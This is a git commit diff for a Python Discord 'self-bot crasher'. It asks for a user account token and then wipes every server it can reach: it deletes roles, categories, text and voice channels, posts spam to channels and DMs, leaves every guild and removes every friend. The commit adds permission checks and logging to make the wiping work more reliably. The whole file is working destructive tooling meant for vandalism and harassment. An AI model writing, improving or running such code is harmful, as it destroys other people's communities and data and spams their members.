34fd3ef8ee2700b8876f3f32ef8a75d17bd5c232
yer7700 <37212234+yer7700@users.noreply.github.com>
2021-06-09 18:04:06 +0300

    Add files via upload

--- main.py
+++ main.py
@@ -2,7 +2,6 @@
 import os
 import sys
 from discord.ext import commands
-from discord.ext.commands import bot
 
 if not os.path.exists('config.txt'):
     srvsname = str(input("Whats crashed servers name you want?\n "))
@@ -10,7 +9,7 @@ if not os.path.exists('config.txt'):
     pchspam = str(input("Whats spam-message for private channels (DMs) you want?\n "))
     saveconfig = str(input("Do you want save config into config.txt? (y/n)\n "))
     if saveconfig == "y":
-        conf = open('config.txt','w')
+        conf = open('config.txt','w',encoding='UTF-8')
         conf.write(f"{srvsname}\n{chspam}\n{pchspam}")
     elif saveconfig == "n":
         pass
@@ -18,31 +17,26 @@ if not os.path.exists('config.txt'):
         sys.exit('Invalid argument!')
 else:
     conf = open('config.txt','r')
-    conf = conf.read().split()
+    conf = conf.read().split('\n')
     srvsname = conf[0]
     chspam = conf[1]
     pchspam = conf[2]
 
 # vars
-client = commands.Bot(command_prefix=None, self_bot=True)
+client = commands.Bot(command_prefix="%selbotcrasher_prefix%", self_bot=True)
 
 # commands
 @client.event
 async def on_ready():
-    for gld in client.guilds:
-        try:
-            await gld.leave()
-        except:
-            pass
     for g in client.guilds:
-        try:
+        if g.me.guild_permissions.manage_roles:
             for r in g.roles:
+                print(f"Trying to delete role {r} in guild {g}")
                 try:
                     await r.delete()
                 except:
                     pass
-        except:
-            pass
+        print(f"Trying to change avatar in guild {g}")
         try:
             with open('avatar.png','rb') as f:
                 try:
@@ -51,39 +45,53 @@ async def on_ready():
                     pass
         except:
             pass
-        try:
-            for ct in g.categories:
-                try:
-                    await ct.delete()
-                except:
-                    pass
-        except:
-            pass
-        try:
-            for c in g.text_channels:
-                try:
-                    await c.send(chspam)
-                except:
-                    pass
-                try:
-                    await c.delete() 
-                except:
-                    pass
-        except:
-            pass
-        try:
-            for vc in g.voice_channels:
-                try:
-                    await vc.delete()
-                except:
-                    pass
-        except:
-            pass
+        if g.me.guild_permissions.manage_channels:
+            try:
+                for ct in g.categories:
+                    print(f"Trying to delete category {ct} in guild {g}")
+                    try:
+                        await ct.delete()
+                    except:
+                        pass
+            except:
+                pass
+            try:
+                for c in g.text_channels:
+                    try:
+                        print(f"Trying to delete text channel {c} in guild {g}")
+                        await c.send(chspam)
+                    except:
+                        pass
+                    try:
+                        await c.delete() 
+                    except:
+                        pass
+            except:
+                pass
+            try:
+                for vc in g.voice_channels:
+                    try:
+                        print(f"Trying to delete voice channel {vc} in guild {g}")
+                        await vc.delete()
+                    except:
+                        pass
+            except:
+                pass
     for dm in client.private_channels:
         try:
+            print(f"Trying to send DM to {dm}")
             await dm.send(pchspam)
         except:
             pass
+    for gld in client.guilds:
+        try:
+            print(f"Trying to leave guild {g}")
+            await gld.leave()
+        except:
+            pass
+    for frnd in client.user.friends:
+        print(f"Trying to remove friend {frnd}")
+        await frnd.remove_friend()
 
 # run
 token = str(input("Token: "))
